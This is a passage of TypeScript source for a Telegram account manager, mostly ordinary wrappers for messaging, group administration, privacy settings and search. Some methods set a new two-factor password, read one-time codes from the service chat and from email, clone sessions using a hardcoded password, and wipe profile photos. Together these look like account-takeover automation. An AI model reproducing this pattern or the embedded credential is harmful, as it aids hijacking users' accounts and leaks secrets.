console.log(\"Checking if mail is ready\");\n\n                    if (imapService.isMailReady()) {\n                        clearInterval(checkMailInterval);\n                        console.log(\"Mail is ready, checking code!\");\n                        await this.client.updateTwoFaSettings({\n                            isCheckPassword: false,\n                            email: twoFaDetails.email,\n                            hint: twoFaDetails.hint,\n                            newPassword: twoFaDetails.newPassword,\n                            emailCodeCallback: async (length) => {\n                                console.log(\"Code sent\");\n                                return new Promise(async (resolve, reject) => {\n                                    let retry = 0;\n                                    const codeInterval = setInterval(async () => {\n                                        try {\n                                            console.log(\"Checking code\");\n                                            retry++;\n                                            if (imapService.isMailReady() && retry < 4) {\n                                                const code = await imapService.getCode();\n                                                console.log('Code:', code);\n                                                if (code) {\n                                                    await imapService.disconnectFromMail();\n                                                    clearInterval(codeInterval);\n                                                    resolve(code);\n                                                }\n                                            } else {\n                                                clearInterval(codeInterval);\n                                                await imapService.disconnectFromMail();\n                                                reject(new Error(\"Failed to retrieve code\"));\n                                            }\n                                        } catch (error) {\n                                            clearInterval(codeInterval);\n                                            await imapService.disconnectFromMail();\n                                            reject(error);\n                                        }\n                                    }, 10000);\n                                });\n                            },\n                            onEmailCodeError: (e) => {\n                                console.error('Email code error:', parseError(e));\n                                return Promise.resolve(\"error\");\n                            }\n                        });\n\n                        return twoFaDetails;\n                    } else {\n                        console.log(\"Mail not ready yet\");\n                    }\n                }, 5000);\n            } catch (e) {\n                console.error(\"Unable to connect to mail server:\", parseError(e));\n            }\n        } else {\n            console.log(\"Password already exists\");\n        }\n    }\n\n\n    async sendPhotoChat(id: string, url: string, caption: string, filename: string): Promise<void> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const filePath = await this.getFileUrl(url, filename);\n        const file = new CustomFile(filePath, fs.statSync(filePath).size, filename);\n        await this.client.sendFile(id, { file, caption });\n    }\n\n    async sendFileChat(id: string, url: string, caption: string, filename: string): Promise<void> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const filePath = await this.getFileUrl(url, filename);\n        const file = new CustomFile(filePath, fs.statSync(filePath).size, filename);\n        await this.client.sendFile(id, { file, caption });\n    }\n\n    async deleteProfilePhotos() {\n        try {\n            const result = await this.client.invoke(\n                new Api.photos.GetUserPhotos({\n                    userId: \"me\"\n                })\n            );\n            console.log(`Profile Pics found: ${result.photos.length}`)\n            if (result && result.photos?.length > 0) {\n                const res = await this.client.invoke(\n                    new Api.photos.DeletePhotos({\n                        id: <Api.TypeInputPhoto[]><unknown>result.photos\n                    }))\n            }\n            console.log(\"Deleted profile Photos\");\n        } catch (error) {\n            throw error\n        }\n    }\n\n    async createNewSession(): Promise<string> {\n        const me = <Api.User>await this.client.getMe();\n        console.log(\"Phne:\", me.phone);\n        const newClient = new TelegramClient(new StringSession(''), parseInt(process.env.API_ID), process.env.API_HASH, {\n            connectionRetries: 1,\n        });\n        await newClient.start({\n            phoneNumber: me.phone,\n            password: async () => \"Ajtdmwajt1@\",\n            phoneCode: async () => {\n                console.log('Waiting for the OTP code from chat ID 777000...');\n                return await this.waitForOtp();\n            },\n            onError: (err: any) => { throw err },\n\n        });\n        const session = <string><unknown>newClient.session.save();\n        // await newClient.disconnect();\n        await newClient.destroy();\n        console.log(\"New Session: \", session)\n        return session\n    }\n\n    async waitForOtp() {\n        for (let i = 0; i < 3; i++) {\n            try {\n                console.log(\"Attempt : \", i)\n                const messages = await this.client.getMessages('777000', { limit: 1 });\n                const message = messages[0];\n                if (message && message.date && message.date * 1000 > Date.now() - 60000) {\n                    const code = message.text.split('.')[0].split(\"code:**\")[1].trim();\n                    console.log(\"returning: \", code);\n                    return code;\n                } else {\n                    console.log(\"Message Date: \", new Date(message.date * 1000).toISOString(), \"Now: \", new Date(Date.now() - 60000).toISOString());\n                    const code = message.text.split('.')[0].split(\"code:**\")[1].trim();\n                    console.log(\"Skipped Code: \", code);\n                    if (i == 2) {\n                        return code;\n                    }\n                    await sleep(5000)\n                }\n            } catch (err) {\n                await sleep(2000)\n                console.log(err)\n            }\n        }\n    }\n\n    async createGroupWithOptions(options: GroupOptions): Promise<Api.Chat | Api.Channel> {\n        if (!this.client) throw new Error('Client not initialized');\n        const result = await this.createGroupOrChannel(options);\n\n        // Find the channel in updates safely\n        let channelId: bigInt.BigInteger | undefined;\n        if ('updates' in result) {\n            const updates = Array.isArray(result.updates) ? result.updates : [result.updates];\n            const channelUpdate = updates.find(u => u instanceof Api.UpdateChannel);\n            if (channelUpdate && 'channelId' in channelUpdate) {\n                channelId = channelUpdate.channelId;\n            }\n        }\n\n        if (!channelId) {\n            throw new Error('Failed to create channel');\n        }\n\n        const channel = await this.client.getEntity(channelId);\n        if (!(channel instanceof Api.Channel)) {\n            throw new Error('Created entity is not a channel');\n        }\n\n        if (options.members?.length) {\n            const users = await Promise.all(\n                options.members.map(member => this.client.getInputEntity(member))\n            );\n\n            await this.client.invoke(new Api.channels.InviteToChannel({\n                channel: await this.client.getInputEntity(channel),\n                users\n            }));\n        }\n\n        if (options.photo) {\n            const buffer = await this.downloadFileFromUrl(options.photo);\n            const inputFile = await this.client.uploadFile({\n                file: new CustomFile('photo.jpg', buffer.length, 'photo.jpg', buffer),\n                workers: 1\n            });\n\n            await this.client.invoke(new Api.channels.EditPhoto({\n                channel: await this.client.getInputEntity(channel),\n                photo: new Api.InputChatUploadedPhoto({\n                    file: inputFile\n                })\n            }));\n        }\n\n        return channel;\n    }\n\n    async updateGroupSettings(settings: {\n        groupId: string;\n        title?: string;\n        description?: string;\n        slowMode?: number;\n        memberRestrictions?: any;\n        username?: string;\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const channel = await this.client.getEntity(settings.groupId);\n\n        if (settings.title) {\n            await this.client.invoke(new Api.channels.EditTitle({\n                channel: channel,\n                title: settings.title || ''\n            }))\n        };\n\n        if (settings.description) {\n            await this.client.invoke(new Api.messages.EditChatAbout({\n                peer: channel,\n                about: settings.description\n            }));\n        }\n\n        if (settings.username) {\n            await this.client.invoke(new Api.channels.UpdateUsername({\n                channel: channel,\n                username: settings.username\n            }));\n        }\n\n\n        if (settings.slowMode !== undefined) {\n            await this.client.invoke(new Api.channels.ToggleSlowMode({\n                channel: channel,\n                seconds: settings.slowMode\n            }));\n        }\n\n        return true;\n    }\n\n    async scheduleMessageSend(opts: MessageScheduleOptions) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const scheduleDate = Math.floor(opts.scheduledTime.getTime() / 1000);\n\n        if (opts.media) {\n            const buffer = await this.downloadFileFromUrl(opts.media.url);\n\n            const uploadedFile = await this.client.uploadFile({\n                file: new CustomFile('media', buffer.length, 'media', buffer),\n                workers: 1\n            });\n\n            return this.client.sendFile(opts.chatId, {\n                file: uploadedFile,\n                caption: opts.message,\n                forceDocument: opts.media.type === 'document',\n                scheduleDate\n            });\n        }\n\n        return this.client.sendMessage(opts.chatId, {\n            message: opts.message,\n            schedule: Math.floor(opts.scheduledTime.getTime() / 1000)\n        });\n    }\n\n    async getScheduledMessages(chatId: string): Promise<Api.TypeMessage[]> {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const result = await this.client.invoke(new Api.messages.GetScheduledHistory({\n            peer: chatId,\n            hash: bigInt(0)\n        }));\n\n        return 'messages' in result && Array.isArray(result.messages)\n            ? result.messages.filter(msg => msg instanceof Api.Message)\n            : [];\n    }\n\n    async sendMediaAlbum(album: MediaAlbumOptions) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const mediaFiles = await Promise.all(\n            album.media.map(async (item) => {\n                const buffer = await this.downloadFileFromUrl(item.url);\n                const uploadedFile = await this.client.uploadFile({\n                    file: new CustomFile('media', buffer.length, 'media', buffer),\n                    workers: 1\n                });\n\n                return new Api.InputSingleMedia({\n                    media: item.type === 'photo'\n                        ? new Api.InputMediaUploadedPhoto({ file: uploadedFile })\n                        : new Api.InputMediaUploadedDocument({\n                            file: uploadedFile,\n                            mimeType: item.type === 'video' ? 'video/mp4' : 'application/octet-stream',\n                            attributes: []\n                        }),\n                    message: item.caption || '',\n                    entities: []\n                });\n            })\n        );\n\n        return this.client.invoke(new Api.messages.SendMultiMedia({\n            peer: album.chatId,\n            multiMedia: mediaFiles\n        }));\n    }\n\n    async sendMessage(params: { peer: string, parseMode?: string, message: string }) {\n        if (!this.client) throw new Error('Client not initialized');\n        const { peer, parseMode, message } = params;\n        return await this.client.sendMessage(peer, { message, parseMode });\n    }\n\n    async sendVoiceMessage(voice: {\n        chatId: string;\n        url: string;\n        duration?: number;\n        caption?: string;\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const buffer = await this.downloadFileFromUrl(voice.url);\n\n        return await this.client.invoke(new Api.messages.SendMedia({\n            peer: voice.chatId,\n            media: new Api.InputMediaUploadedDocument({\n                file: await this.client.uploadFile({\n                    file: new CustomFile('voice.ogg', buffer.length, 'voice.ogg', buffer),\n                    workers: 1\n                }),\n                mimeType: 'audio/ogg',\n                attributes: [\n                    new Api.DocumentAttributeAudio({\n                        voice: true,\n                        duration: voice.duration || 0\n                    })\n                ]\n            }),\n            message: voice.caption || '',\n            randomId: bigInt(Math.floor(Math.random() * 1000000000))\n        }));\n    }\n\n    async cleanupChat(cleanup: {\n        chatId: string;\n        beforeDate?: Date;\n        onlyMedia?: boolean;\n        excludePinned?: boolean;\n        revoke?: boolean;\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n        cleanup.revoke = cleanup.revoke !== undefined ? cleanup.revoke : true;\n\n        const messages = await this.client.getMessages(cleanup.chatId, {\n            limit: 1000,\n            ...(cleanup.beforeDate && {\n                offsetDate: Math.floor(cleanup.beforeDate.getTime() / 1000)\n            })\n        });\n\n        const toDelete = messages.filter(msg => {\n            if (cleanup.excludePinned && msg.pinned) return false;\n            if (cleanup.onlyMedia && !msg.media) return false;\n            return true;\n        });\n\n        if (toDelete.length > 0) {\n            await this.client.deleteMessages(cleanup.chatId, toDelete.map(m => m.id), {\n                revoke: cleanup.revoke\n            })\n        }\n\n        return { deletedCount: toDelete.length };\n    }\n\n    async updatePrivacyBatch(settings: {\n        phoneNumber?: 'everybody' | 'contacts' | 'nobody';\n        lastSeen?: 'everybody' | 'contacts' | 'nobody';\n        profilePhotos?: 'everybody' | 'contacts' | 'nobody';\n        forwards?: 'everybody' | 'contacts' | 'nobody';\n        calls?: 'everybody' | 'contacts' | 'nobody';\n        groups?: 'everybody' | 'contacts' | 'nobody';\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const privacyRules = {\n            everybody: [new Api.InputPrivacyValueAllowAll()],\n            contacts: [new Api.InputPrivacyValueAllowContacts()],\n            nobody: [new Api.InputPrivacyValueDisallowAll()]\n        };\n\n        const updates = [];\n\n        const privacyMap = {\n            phoneNumber: Api.InputPrivacyKeyPhoneNumber,\n            lastSeen: Api.InputPrivacyKeyStatusTimestamp,\n            profilePhotos: Api.InputPrivacyKeyProfilePhoto,\n            forwards: Api.InputPrivacyKeyForwards,\n            calls: Api.InputPrivacyKeyPhoneCall,\n            groups: Api.InputPrivacyKeyChatInvite\n        };\n\n        for (const [key, value] of Object.entries(settings)) {\n            if (value && key in privacyMap) {\n                updates.push(this.client.invoke(new Api.account.SetPrivacy({\n                    key: new privacyMap[key](),\n                    rules: privacyRules[value]\n                })));\n            }\n        }\n\n        await Promise.all(updates);\n        return true;\n    }\n\n    async getSessionInfo() {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const [authorizationsResult, devicesResult] = await Promise.all([\n            this.client.invoke(new Api.account.GetAuthorizations()),\n            this.client.invoke(new Api.account.GetWebAuthorizations())\n        ]);\n\n        const sessions = authorizationsResult.authorizations.map(auth => ({\n            hash: auth.hash.toString(),\n            deviceModel: auth.deviceModel,\n            platform: auth.platform,\n            systemVersion: auth.systemVersion,\n            appName: auth.appName,\n            dateCreated: new Date(auth.dateCreated * 1000),\n            dateActive: new Date(auth.dateActive * 1000),\n            ip: auth.ip,\n            country: auth.country,\n            region: auth.region\n        }));\n\n        const webSessions = devicesResult.authorizations.map(auth => ({\n            hash: auth.hash.toString(),\n            domain: auth.domain,\n            browser: auth.browser,\n            platform: auth.platform,\n            dateCreated: new Date(auth.dateCreated * 1000),\n            dateActive: new Date(auth.dateActive * 1000),\n            ip: auth.ip,\n            region: auth.region\n        }));\n\n        return {\n            sessions,\n            webSessions\n        };\n    }\n\n    async terminateSession(options: {\n        hash: string;\n        type: 'app' | 'web';\n        exceptCurrent?: boolean;\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        if (options.exceptCurrent) {\n            if (options.type === 'app') {\n                await this.client.invoke(new Api.auth.ResetAuthorizations());\n            } else {\n                await this.client.invoke(new Api.account.ResetWebAuthorizations());\n            }\n            return true;\n        }\n\n        if (options.type === 'app') {\n            await this.client.invoke(new Api.account.ResetAuthorization({\n                hash: bigInt(options.hash)\n            }));\n        } else {\n            await this.client.invoke(new Api.account.ResetWebAuthorization({\n                hash: bigInt(options.hash)\n            }));\n        }\n        return true;\n    }\n\n    async getChatStatistics(chatId: string, period: 'day' | 'week' | 'month') {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const now = Math.floor(Date.now() / 1000);\n        const periodInSeconds = {\n            day: 24 * 60 * 60,\n            week: 7 * 24 * 60 * 60,\n            month: 30 * 24 * 60 * 60\n        }[period];\n\n        const messages = await this.client.getMessages(chatId, {\n            limit: 100,\n            offsetDate: now - periodInSeconds\n        });\n\n        const stats = {\n            period,\n            totalMessages: messages.length,\n            uniqueSenders: new Set(messages.map(m => m.fromId?.toString()).filter(Boolean)).size,\n            messageTypes: {\n                text: messages.filter(m => !m.media && m.message).length,\n                photo: messages.filter(m => m.media && m.media.className === 'MessageMediaPhoto').length,\n                video: messages.filter(m => {\n                    if (!m.media || m.media.className !== 'MessageMediaDocument') return false;\n                    const doc = m.media.document;\n                    return doc && 'mimeType' in doc && doc.mimeType?.startsWith('video/');\n                }).length,\n                voice: messages.filter(m => {\n                    if (!m.media || m.media.className !== 'MessageMediaDocument') return false;\n                    const doc = m.media.document;\n                    return doc && 'mimeType' in doc && doc.mimeType?.startsWith('audio/');\n                }).length,\n                other: messages.filter(m => m.media && !['MessageMediaPhoto', 'MessageMediaDocument'].includes(m.media.className)).length\n            },\n            topSenders: Object.entries(\n                messages.reduce((acc, msg) => {\n                    const senderId = msg.fromId?.toString();\n                    if (senderId) {\n                        acc[senderId] = (acc[senderId] || 0) + 1;\n                    }\n                    return acc;\n                }, {} as Record<string, number>)\n            )\n                .sort(([, a], [, b]) => b - a)\n                .slice(0, 10)\n                .map(([id, count]) => ({ id, count })),\n            mostActiveHours: Object.entries(\n                messages.reduce((acc, msg) => {\n                    const hour = new Date(msg.date * 1000).getHours();\n                    acc[hour] = (acc[hour] || 0) + 1;\n                    return acc;\n                }, {} as Record<number, number>)\n            )\n                .sort(([, a], [, b]) => b - a)\n                .map(([hour, count]) => ({ hour: Number(hour), count }))\n        };\n\n        return stats;\n    }\n\n    private getMediaExtension(media: any): string {\n        if (!media) return 'bin';\n\n        switch (media.className) {\n            case 'MessageMediaPhoto':\n                return 'jpg';\n            case 'MessageMediaDocument':\n                const doc = media.document;\n                if (!doc || !('mimeType' in doc)) return 'bin';\n\n                const mime = doc.mimeType;\n                if (mime?.startsWith('video/')) return 'mp4';\n                if (mime?.startsWith('image/')) return mime.split('/')[1];\n                if (mime?.startsWith('audio/')) return 'ogg';\n                return 'bin';\n            default:\n                return 'bin';\n        }\n    }\n\n    private getSearchFilter(filter: string): Api.TypeMessagesFilter {\n        switch (filter) {\n            case 'photo': return new Api.InputMessagesFilterPhotos();\n            case 'video': return new Api.InputMessagesFilterVideo();\n            case 'document': return new Api.InputMessagesFilterDocument();\n            case 'url': return new Api.InputMessagesFilterUrl();\n            case 'roundVideo': return new Api.InputMessagesFilterRoundVideo();\n            case 'phtotoVideo': return new Api.InputMessagesFilterPhotoVideo();\n            case 'voice': return new Api.InputMessagesFilterVoice();\n            case 'roundVoice': return new Api.InputMessagesFilterRoundVoice();\n            case 'gif': return new Api.InputMessagesFilterGif();\n            case 'sticker': return new Api.InputMessagesFilterDocument();\n            case 'animation': return new Api.InputMessagesFilterDocument();\n            case 'music': return new Api.InputMessagesFilterMusic();\n            case 'chatPhoto': return new Api.InputMessagesFilterChatPhotos();\n            case 'location': return new Api.InputMessagesFilterGeo();\n            case 'contact': return new Api.InputMessagesFilterContacts();\n            case 'chatPhoto': return new Api.InputMessagesFilterChatPhotos();\n            case 'phoneCalls': return new Api.InputMessagesFilterPhoneCalls({ missed: false });\n            default: return new Api.InputMessagesFilterEmpty();\n        }\n    }\n\n    private getMediaType(media: Api.TypeMessageMedia): 'photo' | 'video' | 'document' {\n        if (media instanceof Api.MessageMediaPhoto) {\n            return 'photo';\n        } else if (media instanceof Api.MessageMediaDocument) {\n            const document = media.document as Api.Document;\n            if (document.attributes.some(attr => attr instanceof Api.DocumentAttributeVideo)) {\n                return 'video';\n            }\n            return 'document';\n        }\n        return 'document';\n    }\n\n    private getEntityId(entity: Api.TypeInputPeer | Api.TypeUser | Api.TypeChat): string {\n        if (entity instanceof Api.User) return entity.id.toString();\n        if (entity instanceof Api.Channel) return entity.id.toString();\n        if (entity instanceof Api.Chat) return entity.id.toString();\n        return '';\n    }\n\n    async addGroupMembers(groupId: string, members: string[]): Promise<void> {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const channel = await this.client.getInputEntity(groupId);\n        const users = await Promise.all(\n            members.map(member => this.client.getInputEntity(member))\n        );\n\n        await this.client.invoke(new Api.channels.InviteToChannel({\n            channel: channel,\n            users\n        }));\n    }\n\n    async removeGroupMembers(groupId: string, members: string[]): Promise<void> {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const channel = await this.client.getInputEntity(groupId);\n        for (const member of members) {\n            const user = await this.client.getInputEntity(member);\n            await this.client.invoke(new Api.channels.EditBanned({\n                channel: channel,\n                participant: user,\n                bannedRights: new Api.ChatBannedRights({\n                    untilDate: 0,\n                    viewMessages: true,\n                    sendMessages: true,\n                    sendMedia: true,\n                    sendStickers: true,\n                    sendGifs: true,\n                    sendGames: true,\n                    sendInline: true,\n                    embedLinks: true\n                })\n            }));\n        }\n    }\n\n    async promoteToAdmin(\n        groupId: string,\n        userId: string,\n        permissions?: {\n            changeInfo?: boolean;\n            postMessages?: boolean;\n            editMessages?: boolean;\n            deleteMessages?: boolean;\n            banUsers?: boolean;\n            inviteUsers?: boolean;\n            pinMessages?: boolean;\n            addAdmins?: boolean;\n            anonymous?: boolean;\n            manageCall?: boolean;\n        },\n        rank?: string\n    ): Promise<void> {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const channel = await this.client.getInputEntity(groupId);\n        const user = await this.client.getInputEntity(userId);\n\n        await this.client.invoke(new Api.channels.EditAdmin({\n            channel: channel,\n            userId: user,\n            adminRights: new Api.ChatAdminRights({\n                changeInfo: permissions?.changeInfo ?? false,\n                postMessages: permissions?.postMessages ?? false,\n                editMessages: permissions?.editMessages ?? false,\n                deleteMessages: permissions?.deleteMessages ?? false,\n                banUsers: permissions?.banUsers ?? false,\n                inviteUsers: permissions?.inviteUsers ?? true,\n                pinMessages: permissions?.pinMessages ?? false,\n                addAdmins: permissions?.addAdmins ?? false,\n                anonymous: permissions?.anonymous ?? false,\n                manageCall: permissions?.manageCall ?? false,\n                other: false\n            }),\n            rank: rank || ''\n        }));\n    }\n\n    async demoteAdmin(groupId: string, userId: string): Promise<void> {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const channel = await this.client.getInputEntity(groupId);\n        const user = await this.client.getInputEntity(userId);\n\n        await this.client.invoke(new Api.channels.EditAdmin({\n            channel: channel,\n            userId: user,\n            adminRights: new Api.ChatAdminRights({\n                changeInfo: false,\n                postMessages: false,\n                editMessages: false,\n                deleteMessages: false,\n                banUsers: false,\n                inviteUsers: false,\n                pinMessages: false,\n                addAdmins: false,\n                anonymous: false,\n                manageCall: false,\n                other: false\n            }),\n            rank: ''\n        }));\n    }\n\n    async unblockGroupUser(groupId: string, userId: string): Promise<void> {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const channel = await this.client.getInputEntity(groupId);\n        const user = await this.client.getInputEntity(userId);\n\n        await this.client.invoke(new Api.channels.EditBanned({\n            channel: channel,\n            participant: user,\n            bannedRights: new Api.ChatBannedRights({\n                untilDate: 0,\n                viewMessages: false,\n                sendMessages: false,\n                sendMedia: false,\n                sendStickers: false,\n                sendGifs: false,\n                sendGames: false,\n                sendInline: false,\n                embedLinks: false\n            })\n        }));\n    }\n\n    async getGroupAdmins(groupId: string): Promise<Array<{\n        userId: string;\n        rank?: string;\n        permissions: {\n            changeInfo: boolean;\n            postMessages: boolean;\n            editMessages: boolean;\n            deleteMessages: boolean;\n            banUsers: boolean;\n            inviteUsers: boolean;\n            pinMessages: boolean;\n            addAdmins: boolean;\n            anonymous: boolean;\n            manageCall: boolean;\n        };\n    }>> {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const result = await this.client.invoke(new Api.channels.GetParticipants({\n            channel: await this.client.getInputEntity(groupId),\n            filter: new Api.ChannelParticipantsAdmins(),\n            offset: 0,\n            limit: 100,\n            hash: bigInt(0)\n        }));\n\n        if ('users' in result) {\n            const participants = result.participants as Api.ChannelParticipantAdmin[];\n            const users = result.users;\n\n            return participants.map(participant => {\n                const adminRights = participant.adminRights as Api.ChatAdminRights;\n                return {\n                    userId: participant.userId.toString(),\n                    rank: participant.rank || '',\n                    permissions: {\n                        changeInfo: adminRights.changeInfo || false,\n                        postMessages: adminRights.postMessages || false,\n                        editMessages: adminRights.editMessages || false,\n                        deleteMessages: adminRights.deleteMessages || false,\n                        banUsers: adminRights.banUsers || false,\n                        inviteUsers: adminRights.inviteUsers || false,\n                        pinMessages: adminRights.pinMessages || false,\n                        addAdmins: adminRights.addAdmins || false,\n                        anonymous: adminRights.anonymous || false,\n                        manageCall: adminRights.manageCall || false\n                    }\n                };\n            });\n        }\n        return [];\n    }\n\n    async getGroupBannedUsers(groupId: string): Promise<Array<{\n        userId: string;\n        bannedRights: {\n            viewMessages: boolean;\n            sendMessages: boolean;\n            sendMedia: boolean;\n            sendStickers: boolean;\n            sendGifs: boolean;\n            sendGames: boolean;\n            sendInline: boolean;\n            embedLinks: boolean;\n            untilDate: number;\n        };\n    }>> {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const result = await this.client.invoke(new Api.channels.GetParticipants({\n            channel: await this.client.getInputEntity(groupId),\n            filter: new Api.ChannelParticipantsBanned({ q: '' }),\n            offset: 0,\n            limit: 100,\n            hash: bigInt(0)\n        }));\n\n        if ('users' in result) {\n            const participants = result.participants as Api.ChannelParticipantBanned[];\n\n            return participants.map(participant => {\n                const bannedRights = participant.bannedRights as Api.ChatBannedRights;\n                return {\n                    userId: (participant.peer as Api.PeerChat).chatId.toString(),\n                    bannedRights: {\n                        viewMessages: bannedRights.viewMessages || false,\n                        sendMessages: bannedRights.sendMessages || false,\n                        sendMedia: bannedRights.sendMedia || false,\n                        sendStickers: bannedRights.sendStickers || false,\n                        sendGifs: bannedRights.sendGifs || false,\n                        sendGames: bannedRights.sendGames || false,\n                        sendInline: bannedRights.sendInline || false,\n                        embedLinks: bannedRights.embedLinks || false,\n                        untilDate: bannedRights.untilDate || 0\n                    }\n                };\n            });\n        }\n        return [];\n    }\n\n    async searchMessages(params: SearchMessagesDto): Promise<SearchMessagesResponseDto> {\n        if (!this.client) throw new Error('Client not initialized');\n        const finalResult = {\n            video: { messages: [], total: 0 },\n            photo: { messages: [], total: 0 },\n            document: { messages: [], total: 0 },\n            voice: { messages: [], total: 0 },\n            text: { messages: [], total: 0 },\n            all: { messages: [], total: 0 },\n            roundVideo: { messages: [], total: 0 },\n            roundVoice: { messages: [], total: 0 },\n        }\n        const { chatId, query = '', types, maxId, minId, limit } = params;\n        console.log(\"Types: \", types);\n        for (const type of types) {\n            const filter = this.getSearchFilter(type);\n            const queryFilter = {\n                limit: limit || 500,\n                ...(maxId ? { maxId } : {}),\n                ...(minId ? { minId } : {}),\n            };\n\n            console.log(type, queryFilter);\n            const searchQuery = {\n                q: query,\n                filter: filter,\n                ...queryFilter,\n                hash: bigInt(0),\n            }\n            let messages = [];\n            let count = 0;\n            console.log(\"Search Query: \", searchQuery);\n            if (chatId) {\n                searchQuery['peer'] = await this.safeGetEntity(chatId);\n                console.log(\"Performing search in chat: \", chatId);\n                const result = await this.client.invoke(\n                    new Api.messages.Search(searchQuery)\n                );\n\n                if (!('messages' in result)) {\n                    return {};\n                }\n                console.log(type, result?.messages?.length, result[\"count\"]);\n                count = result[\"count\"] || 0;\n                messages = result.messages as Api.Message[];\n            } else {\n                console.log(\"Performing global search\");\n                const result = await this.client.invoke(\n                    new Api.messages.SearchGlobal({\n                        ...searchQuery,\n                        offsetRate: 0,\n                        offsetPeer: new Api.InputPeerEmpty(),\n                        offsetId: 0,\n                        usersOnly: true\n                    })\n                );\n                if (!('messages' in result)) {\n                    return {};\n                }\n                console.log(type, result?.messages?.length, result[\"count\"]);\n                count = result[\"count\"] || 0;\n                messages = result.messages as Api.Message[];\n            }\n            if (types.includes(MessageMediaType.TEXT) && types.length === 1) {\n                console.log(\"Text Filter\");\n                messages = messages.filter((msg: Api.Message) => !('media' in msg));\n            }\n            const processedMessages = await Promise.all(messages.map(async (message: Api.Message) => {\n                const unwantedTexts = [\n                    'movie', 'series', 'tv show', 'anime', 'x264', 'aac', '720p', '1080p', 'dvd',\n                    'paidgirl', 'join', 'game', 'free', 'download', 'torrent', 'link', 'invite',\n                    'invite link', 'invitation', 'invitation link', 'customers', 'confirmation', 'earn', 'book', 'paper', 'pay',\n                    'qr', 'invest', 'tera', 'disk', 'insta', 'mkv', 'sub', '480p', 'hevc', 'x265', 'bluray',\n                    'mdisk', 'diskwala', 'tera', 'online', 'watch', 'click', 'episode', 'season', 'part', 'action',\n                    'adventure', 'comedy', 'drama', 'fantasy', 'horror', 'mystery', 'romance', 'sci-fi', 'thriller',\n                    'demo', 'dress', 'netlify', 'service', 'follow', 'like', 'comment', 'share', 'subscribe',\n                    'premium', 'premium', 'unlock', 'access', 'exclusive', 'limited', 'offer', 'deal',\n                    'discount', 'sale', 'free trial', 'free access', 'free download', 'free gift', 'freebie',\n                    'crypto', 'currency', 'coin', 'blockchain', 'wallet', 'exchange', 'trading', 'investment',\n                ]\n                if (message.media && message.media instanceof Api.MessageMediaDocument) {\n                    const document = message.media.document as Api.Document;\n                    const fileNameAttr = document.attributes.find(attr => attr instanceof Api.DocumentAttributeFilename);\n                    const fileName = fileNameAttr && fileNameAttr instanceof Api.DocumentAttributeFilename ? fileNameAttr.fileName : '';\n                    const fileNameText = fileName.toLowerCase();\n                    const isWantedFile = !contains(fileNameText, unwantedTexts);\n                    return isWantedFile ? message.id : null;\n                } else {\n                    const messageText = (message.text || '').toLowerCase();\n                    const containsFilteredContent = contains(messageText, unwantedTexts);\n                    return !containsFilteredContent ? message.id : null;\n                }\n            }));\n\n            const filteredMessages = processedMessages.filter(id => id !== null);\n            const localResult = {\n                messages: filteredMessages,\n                total: count ? count : filteredMessages.length\n            }\n            finalResult[`${type}`] = localResult;\n        }\n        return finalResult\n    }\n\n    async getAllMediaMetaData(params: {\n        chatId: string;\n        types?: ('photo' | 'video' | 'document' | 'voice')[];\n        startDate?: Date;\n        endDate?: Date;\n        maxId?: number;\n        minId?: number;\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n        const { chatId, types = ['photo', 'video'], startDate, endDate, maxId, minId } = params;\n        let allMedia: any[] = [];\n        let hasMore = true;\n        let lastOffsetId = 0;\n        const limit = 200;\n\n        while (hasMore) {\n            const response = await this.getMediaMetadata({\n                chatId,\n                types,\n                startDate,\n                endDate,\n                limit,\n                maxId: lastOffsetId,\n                minId\n            });\n            console.log(\"hasMore: \", response.hasMore, \"Total: \", response.total, \"lastOffsetId: \", response.lastOffsetId);\n            allMedia = allMedia.concat(response.messages);\n\n            if (!response.hasMore) {\n                hasMore = false;\n                console.log('No more messages to fetch');\n            } else {\n                lastOffsetId = response.lastOffsetId;\n                console.log(`Fetched ${allMedia.length} messages so far`);\n            }\n            await sleep(3000);\n        }\n\n        return {\n            messages: allMedia,\n            total: allMedia.length,\n        };\n    }\n\n    async getFilteredMedia(params: {\n        chatId: string;\n        types?: ('photo' | 'video' | 'document' | 'voice')[];\n        startDate?: Date;\n        endDate?: Date;\n        limit?: number;\n        maxId?: number;\n        minId?: number;\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const { chatId, types = ['photo', 'video', 'document'], startDate, endDate, limit = 50, maxId, minId } = params;\n\n        const query: Partial<IterMessagesParams> = {\n            limit: limit || 100,\n            ...(maxId ? { maxId } : {}),\n            ...(minId ? { minId } : {}),\n            ...(startDate && { minDate: Math.floor(startDate.getTime() / 1000) }),\n            ...(endDate && { maxDate: Math.floor(endDate.getTime() / 1000) })\n        };\n\n        const ent = await this.safeGetEntity(chatId);\n        console.log(query);\n        const messages = await this.client.getMessages(ent, query);\n        console.log(`Fetched ${messages.length} messages`);\n\n        const filteredMessages = messages.filter(message => {\n            if (!message.media) return false;\n            const mediaType = this.getMediaType(message.media);\n            return types.includes(mediaType);\n        });\n\n        console.log(`Filtered down to ${filteredMessages.length} messages`);\n        const mediaData = await Promise.all(filteredMessages.map(async (message: Api.Message) => {\n            let thumbBuffer = null;\n\n            try {\n                if (message.media instanceof Api.MessageMediaPhoto) {\n                    const sizes = (<Api.Photo>message.photo)?.sizes || [1];\n                    thumbBuffer = await this.downloadWithTimeout(\n                        this.client.downloadMedia(message, { thumb: sizes[1] || sizes[0] }) as any,\n                        5000\n                    );\n                } else if (message.media instanceof Api.MessageMediaDocument) {\n                    const sizes = message.document?.thumbs || [1];\n                    thumbBuffer = await 